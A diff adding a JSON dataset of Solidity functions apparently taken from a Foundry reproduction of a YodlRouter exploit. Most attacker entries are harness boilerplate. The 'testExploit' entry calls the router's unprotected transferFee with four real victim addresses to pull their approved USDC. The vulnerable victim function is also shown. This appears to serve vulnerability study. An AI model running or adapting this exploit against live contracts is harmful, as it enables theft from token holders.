@@ -1,0 +1,100 @@
+[
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(USDC);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NoName",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        uint256 amount;\n        uint256 feeBps = 10_000;\n        address token = USDC;\n        address from;\n        address to = address(this);\n\n        // Victim 0\n        from = 0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0;\n        amount = 45_588_747_326;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n\n        // Victim 1\n        from = 0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E;\n        amount = 1_219_608_225;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n\n        // Victim 2\n        from = 0x2c349022df145C1a2eD895B5577905e6F1Bc7881;\n        amount = 1_000_000_000;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n\n        // Victim 3\n        from = 0x96D0F726FD900E199680277aAaD326fbdebc6BF9;\n        amount = 1_000_000;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IR",
+    "source_type": "victim_contract",
+    "function_name": "transferFee",
+    "original_code": "    function transferFee(uint256 amount, uint256 feeBps, address token, address from, address to)\n        public\n        returns (uint256)\n    {\n        uint256 fee = calculateFee(amount, feeBps);\n        if (fee > 0) {\n            if (token != NATIVE_TOKEN) {\n                // ERC20 token\n                if (from == address(this)) {\n                    TransferHelper.safeTransfer(token, to, fee);\n                } else {\n                    // safeTransferFrom requires approval\n                    TransferHelper.safeTransferFrom(token, from, to, fee);\n                }\n            } else {\n                require(from == address(this), \"can only transfer eth from the router address\");\n\n                // Native ether\n                (bool success,) = to.call{value: fee}(\"\");\n                require(success, \"transfer failed in transferFee\");\n            }\n            return fee;\n        } else {\n            return 0;\n        }\n    }\n}\n",
+    "description": ""
+  }
+]
